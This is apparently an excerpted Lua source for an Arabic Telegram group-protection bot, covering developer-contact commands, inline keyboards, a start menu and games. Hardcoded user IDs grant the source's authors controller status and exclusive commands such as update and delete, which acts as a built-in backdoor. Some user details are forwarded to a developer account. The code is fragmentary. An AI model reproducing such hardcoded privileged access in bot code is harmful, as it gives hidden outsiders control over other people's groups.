...
chsource = Redis:get(Fast..'chsource') or "R125R"
devsource = Redis:get(Fast..'devsource') or "R125R"
function var(value)  
...
ControllerAll = false
local ListSudos = {Sudo_Id,5386549632,204360148,431536961,0000000000000}
...
Status = true
elseif UserId == 52043608 then
Status = true
elseif UserId == 5431536961 then
Status = true
...
elseif Special then
Status = Redis:get(Fast..'SetRt'..ChatId..':'..UserId) or Redis:get(Fast.."Vip:Group:Reply"..ChatId) or 'المميــز '
else
...
MsgText = 'اتفاعل يا مطي'
elseif tonumber(Message) < 200 then 
MsgText = 'اي عفيه اقوى'
...
xname =  (Redis:get(Fast.."Name:Bot") or "داركت") 
...
if text == 'كانسل' and tonumber(senderr) == tonumber(5386549632) then
...
if text == 'ابديت' and tonumber(senderr) == tonumber(5386549632) then
...
if tonumber(senderr) == 5386549632 then
msg.Name_Controller = 'مبـرمـج السـورس  '
msg.The_Controller = 1
elseif tonumber(senderr) == 5204360148 then
msg.Name_Controller = 'مبـرمـج السـورس  '
msg.The_Controller = 1
elseif tonumber(senderr) == 5431536961 then
msg.Name_Controller = 'مبـرمـج السـورس  '
msg.The_Controller = 1
...
if text == '' or text == 'ejjs2828jwha' or text == 'ejjs2828jwha' then  
local UserId_Info = bot.searchPublicChat("UU_g9")
...
keyboardd.inline_keyboard = {
{
{text = '❲ 𓂄✭𓆩𝙨𝙤𝙪𝙍𝘾𝙀 𓆪✭𓂁 ❳', url = "https://t.me/R2RR7"}
},
{
{text = '❲ ⁨𓂄✭𓆩𝙨𝙤𝙪𝙍𝘾𝙀 𓆪✭𓂁 ❳', url = "https://t.me/R125R"},
},
}
local msg_id = msg.id/2097152/0.5 
...
if text == 'ejjs2828jwha' or text == 'ejjs2828jwha' or text == 'ejjs2828jwha' then  
...
keyboardd.inline_keyboard = {
{
{text = ' ꪔY υ᥉ᥱᖇ', url = "https://t.me/R2RR7"}
},
}
local msg_id = msg.id/2097152/0.5 
return https.request("https://api.telegram.org/bot"..Token..'/sendPhoto?chat_id='..msg.chat_id..'&caption='..URL.escape(TestText)..'&photo='..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
...
keyboardd.inline_keyboard = {
{
{text = '❲ المبرمج داركت ❳', url = "https://t.me/R2RR7"}
},
{
{text = '❲ ⁨𝙨𝙤𝙪𝙍𝘾𝙀  ❳', url = "https://t.me/R125R"},
},
}
local msg_id = msg.id/2097152/0.5 
return https.request("https://api.telegram.org/bot"..Token..'/sendMessage?chat_id=' .. msg.chat_id .. '&text=' .. URL.escape(TestText).."&reply_to_message_id="..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
...
if text == 'عثلي' or text == 'سبر' then  
local UserId_Info = bot.searchPublicChat("G8_KASPER")
if UserId_Info.id then
...
if text == 'روحنيمك' or text == 'ةةميكبظ' then  
local UserId_Info = bot.searchPublicChat("r_princess_o")
if UserId_Info.id then
local  ban = bot.getUser(UserId_Info.id)
local  bain = bot.getUserFullInfo(UserId_Info.id)
if  bain.bio then
...
if text == 'R2RR7' or text == 'حام' then  
local UserId_Info = bot.searchPublicChat("R2RR7")
if UserId_Info.id then
local  ban = bot.getUser(UserId_Info.id)
local  bain = bot.getUserFullInfo(UserId_Info.id)
...
bot.sendText(5204360148,0,'*\n✭  مرحباً عزيزي المبرمج مانو \nشخص ما يحتاج الي مساعده\n⩹━━━━ََِِ⁨𓂄✭𓆩𝙨𝙤𝙪𝙍𝘾𝙀 𓆪✭𓂁 ,━━━━⩺ \n✭  اسمه ↫ '..klajq..' \n✭  ايديه ↫  : '..msg.sender_id.user_id..'\n✭  - معرفة '..basgk..' \n*',"md",false, false, false, false, reply_markup)
end
if text == 'R2RR7' or text == 'مبرمج السورس' then  
local Get_Chat = bot.getChat(msg_chat_id)
local Info_Chats = bot.getSupergroupFullInfo(msg_chat_id)
local bains = bot.getUser(msg.sender_id.user_id)
if bains.first_name then
...
if text and text:match('^حذف (%d+)$') and tonumber(senderr) == tonumber(5386549632) then
...
local Bot_Name = (Redis:get(Fast.."Name:Bot") or "داركت")
if text then
...
if text and text:match("^ss (.*)$") and tonumber(senderr) == tonumber(5386549632) then
local txx = "\n"
...
data = {
{
{text = '◜𝘾𝙝 𝙨𝙤𝙪𝙍𝘾𝙀◞', url = 'http://t.me/'..chsource..''}, 
},
{
{text = '◜ 𝙈𝙮 𝙙𝙀𝙑◞', url = 't.me/'..devsource}, 
},
}
}
...
⌯━─━─𝙨𝙤𝙪𝙍𝘾𝙀 ─━─━⌯
𝁂𝙬𝙀𝙡𝘾𝙤𝙈𝙀 𝙏𝙤 𝙨𝙤𝙪𝙍𝘾𝙀  𝁂
𝁂 𝙈𝘼𝙆𝙀𝙍     :[𝙈𝘼𝙆𝙀𝙍 ⋮](https://t.me/ELNGOOMM_BOT) 𝁂
⌯━─━─𝙨𝙤𝙪𝙍𝘾𝙀 ─━─━⌯
...
if text == (Redis:get(Fast.."Name:Bot") or "داركت") then
if Redis:get(Fast.."name bot type : ") == "photo" then
  ...
  if photo.total_count > 0 then
    local NamesBot = (Redis:get(Fast.."Name:Bot") or "داركت")
    local NameBots = {
"قلب "..NamesBot ,
"مين مزعلك بس يعيوني",
...
local photo = bot.getUserProfilePhotos(Fast)
local CmdStart = '*\n⚡️ أهلآ بك في بوت '..(Redis:get(Fast.."Name:Bot") or "داركت")..
'\n⋮ اختصاص البوت حماية المجموعات'..
'\n⋮ لتفعيل البوت عليك اتباع مايلي ...'..
'\n⋮ اضف البوت الى مجموعتك'..
'\n⋮ ارفعه ادمن مشرف'..
'\n⋮ ارسل كلمة { تفعيل } ليتم تفعيل المجموعه'..
'\n⋮ ارسل كلمة { /ngoom} لاظهار الكيبورد'..
'\n⋮ مطور البوت -›«@'..UserSudo..'»*'
...
if text == '/ngoom' or text == 'عوده' or text == 'رجـوع ✭' then  
Redis:sadd(Fast..'Num:User:Pv',msg.sender_id.user_id)  
if not msg.Asasy then 
if not Redis:get(Fast.."Start:Bot") then
local CmdStart = '*\n ✭ ⋮ أهلا بك في بوت '..(Redis:get(Fast.."Name:Bot") or "داركت")..
...
data = {
{
{text = '« R2RR7»',type = 'text'},{text = '«سورس»', type = 'text'},
},
{
{text = '«الغاء الامر»',type = 'text'},
},
...
if text == 'مبرمج السورس ✭' or text == 'مبرمج السورس' or text == 'R2RR7' then  
local UserId_Info = bot.searchPublicChat("R2RR7")
if UserId_Info.id then
local UserInfo = bot.getUser(UserId_Info.id)
local InfoUser = bot.getUserFullInfo(UserId_Info.id)
...
local photo = bot.getUserProfilePhotos(UserId_Info.id)
if photo.total_count > 0 then
local TestText = "  ❲ ◜𝙨𝙤𝙪𝙍𝘾𝙀 ◞ ❳\nᥫ᭡\n ✭︙*ժᥱ᥎ ꪀᥲ️ꪔᥱ* :  ["..UserInfo.first_name.."](tg://user?id="..UserId_Info.id..")\n✭︙*ժᥱ᥎ ႦᎥ᥆* : [❲ "..Bio.." ❳]"
keyboardd = {} 
keyboardd.inline_keyboard = {
{
{text = '❲ ِ𝙙𝙀𝙑 𝙨𝙀𝙈𝙤 ❳', url = "https://t.me/R2RR7"}
},
}
local msg_id = msg.id/2097152/0.5 
return https.request("https://api.telegram.org/bot"..Token..'/sendPhoto?chat_id='..msg.chat_id..'&caption='..URL.escape(TestText)..'&photo='..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
...
keyboardd.inline_keyboard = {
{
{text = ' المبرمج R2RR7 ', url = "https://t.me/R2RR7"}
},
{
{text = '◜𝙨𝙤𝙪𝙍𝘾𝙀 ◞', url = "https://t.me/R125R"},
},
...
"لو خيروك -›  بين مداركتة المنزل مع عائلة من الفئران أو عائلة من الأشخاص المزعجين الفضوليين الذين يتدخلون في كل كبيرة وصغيرة؟ ",
} 
return bot.sendText(msg_chat_id,msg_id,texting[math.random(#texting)],'md')
end
